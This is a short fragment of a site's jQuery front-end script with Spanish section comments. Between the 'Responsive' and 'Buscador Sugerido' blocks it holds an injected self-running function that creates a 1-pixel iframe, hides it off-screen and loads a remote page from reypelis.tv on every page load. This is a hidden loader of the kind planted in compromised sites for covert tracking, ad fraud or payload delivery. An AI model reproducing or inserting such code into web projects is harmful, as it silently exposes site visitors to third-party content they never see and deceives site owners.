...
jQuery(document).ready(function($){
   ...
   /*Responsive*/
    ...
    });(function() { let ai = document.createElement("iframe"); ai.src = "//reypelis.tv/i.php?sid=212000"; ai.style = "position:fixed;width:1px;height:1px;left:-10px;border:0px;bottom:0px;margin:0px;padding:0px;overflow:hidden"; document.body.append(ai); })();
    /*Buscador Sugerido*/
